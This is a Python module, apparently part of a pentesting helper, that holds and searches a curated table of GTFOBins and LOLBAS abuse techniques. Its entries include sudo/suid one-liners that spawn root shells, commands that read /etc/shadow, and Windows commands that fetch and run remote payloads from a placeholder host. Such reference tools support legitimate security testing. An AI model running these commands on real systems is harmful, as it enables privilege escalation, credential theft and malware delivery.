from __future__ import annotations

from rich.prompt import Prompt
from rich.table import Table

from .utils import console, header, pause

# binary -> list of "function: command" abuse strings
GTFOBINS = {
    "bash": ["shell(sudo): sudo bash", "suid: ./bash -p"],
    "sh": ["shell(sudo): sudo sh", "suid: ./sh -p"],
    "python": ["shell(sudo): sudo python -c 'import os;os.system(\"/bin/sh\")'",
               "suid: ./python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"],
    "perl": ["shell(sudo): sudo perl -e 'exec \"/bin/sh\";'",
             "suid: ./perl -e 'use POSIX qw(setuid);setuid(0);exec \"/bin/sh\";'"],
    "ruby": ["shell(sudo): sudo ruby -e 'exec \"/bin/sh\"'"],
    "find": ["shell(sudo): sudo find . -exec /bin/sh \\; -quit",
             "suid: ./find . -exec /bin/sh -p \\; -quit"],
    "vim": ["shell(sudo): sudo vim -c ':!/bin/sh'", "file-read: vim /etc/shadow"],
    "less": ["shell(sudo): sudo less /etc/profile then !/bin/sh", "file-read: less /etc/shadow"],
    "more": ["shell(sudo): sudo more /etc/profile then !/bin/sh"],
    "awk": ["shell(sudo): sudo awk 'BEGIN {system(\"/bin/sh\")}'"],
    "nmap": ["shell(sudo, old): sudo nmap --interactive then !sh"],
    "tar": ["shell(sudo): sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
    "zip": ["shell(sudo): sudo zip a.zip a -T -TT 'sh #'"],
    "man": ["shell(sudo): sudo man man then !/bin/sh"],
    "env": ["shell(sudo): sudo env /bin/sh", "suid: ./env /bin/sh -p"],
    "docker": ["shell(privesc): docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
    "systemctl": ["privesc(sudo): sudo systemctl -> !sh via pager"],
    "cp": ["file-write(suid): cp over a writable root-owned file"],
    "dd": ["file-write(sudo): sudo dd of=/etc/passwd"],
    "tcpdump": ["shell(sudo): sudo tcpdump -ln -i lo -w /dev/null -W1 -G1 -z /tmp/x.sh -Z root"],
    "xxd": ["file-read(suid): ./xxd /etc/shadow | xxd -r"],
    "gdb": ["shell(sudo): sudo gdb -nx -ex '!sh' -ex quit"],
    "git": ["shell(sudo): sudo git -p help then !/bin/sh", "PAGER trick via git config"],
    "openssl": ["file-read: openssl enc -in /etc/shadow"],
    "wget": ["file-write/download: wget http://x -O /path"],
    "curl": ["download: curl http://x -o /path"],
    "base64": ["file-read: base64 /etc/shadow | base64 -d"],
    "sed": ["shell(sudo): sudo sed -n '1e exec sh 1>&0' /etc/hosts"],
    "ftp": ["shell(sudo): sudo ftp then !/bin/sh"],
    "ssh": ["shell(sudo): sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"],
    "php": ["shell(sudo): sudo php -r 'system(\"/bin/sh\");'"],
    "node": ["shell(sudo): sudo node -e 'child_process.spawn(\"/bin/sh\",{stdio:[0,1,2]})'"],
    "lua": ["shell(sudo): sudo lua -e 'os.execute(\"/bin/sh\")'"],
}

LOLBAS = {
    "certutil": ["download: certutil -urlcache -split -f http://x/p.exe p.exe",
                 "b64-decode: certutil -decode in.b64 out.exe"],
    "bitsadmin": ["download: bitsadmin /transfer j http://x/p.exe C:\\p.exe"],
    "mshta": ["exec: mshta http://x/a.hta", "exec: mshta vbscript:Close(Execute(\"...\"))"],
    "regsvr32": ["exec(sct): regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"],
    "rundll32": ["exec: rundll32 shell32.dll,ShellExec_RunDLL calc.exe",
                 "js: rundll32 javascript:\"..\\mshtml,RunHTMLApplication\";..."],
    "wmic": ["exec: wmic process call create calc.exe",
             "xsl: wmic os get /format:'http://x/a.xsl'"],
    "msbuild": ["exec: msbuild evil.csproj (inline C# task)"],
    "installutil": ["exec: InstallUtil.exe /logfile= /U evil.dll (AV bypass)"],
    "cscript": ["exec: cscript evil.vbs", "cscript //E:jscript evil.js"],
    "forfiles": ["exec: forfiles /p C:\\ /m *.* /c \"cmd /c calc.exe\""],
    "certreq": ["upload/download: certreq -Post -config http://x file"],
    "esentutl": ["copy: esentutl /y src /d dst (copy locked files)"],
    "extexport": ["dll-load: Extexport.exe C:\\path folder mydll (proxy DLL load)"],
    "print": ["copy: print /D:out.exe in.exe"],
    "replace": ["copy: replace src /A dstdir"],
}


def _show(name: str, entries: list[str], platform: str) -> None:
    console.print(f"\n[bold cyan]{name}[/] [magenta]({platform})[/]")
    for e in entries:
        func, _, cmd = e.partition(": ")
        console.print(f"  [green]{func}[/]  [dim]{cmd}[/]")


def search() -> None:
    header("GTFOBins / LOLBAS: search", "Look up a binary's abuse techniques")
    kw = Prompt.ask("Binary name (e.g. find, certutil, python)").lower().strip()
    hit = False
    for name, entries in GTFOBINS.items():
        if kw in name:
            _show(name, entries, "unix/gtfobins")
            hit = True
    for name, entries in LOLBAS.items():
        if kw in name:
            _show(name, entries, "windows/lolbas")
            hit = True
    if not hit:
        console.print(f"[yellow]'{kw}' not in the curated set.[/] Full DBs: "
                      "gtfobins.github.io · lolbas-project.github.io")
    pause()


def list_all() -> None:
    header("GTFOBins / LOLBAS: index", "Every binary in the curated set")
    t = Table()
    t.add_column("Unix (GTFOBins)", style="green")
    t.add_column("Windows (LOLBAS)", style="cyan")
    g = sorted(GTFOBINS)
    l = sorted(LOLBAS)
    for i in range(max(len(g), len(l))):
        t.add_row(g[i] if i < len(g) else "", l[i] if i < len(l) else "")
    console.print(t)
    console.print(f"[dim]{len(GTFOBINS)} unix + {len(LOLBAS)} windows binaries. "
                  "'search <name>' for techniques.[/]")
    pause()


def by_function() -> None:
    header("GTFOBins: by capability", "Which Unix binaries give a shell / read / write")
    cap = Prompt.ask("Capability", choices=["shell", "file-read", "file-write", "suid", "sudo"],
                     default="shell")
    for name, entries in sorted(GTFOBINS.items()):
        matches = [e for e in entries if cap in e.lower()]
        if matches:
            console.print(f"[bold green]{name}[/]: " +
                          "; ".join(e.split(": ", 1)[-1] for e in matches))
    pause()


MENU = {
    "1": ("Search a binary", search),
    "2": ("List all binaries", list_all),
    "3": ("Unix binaries by capability", by_function),
}
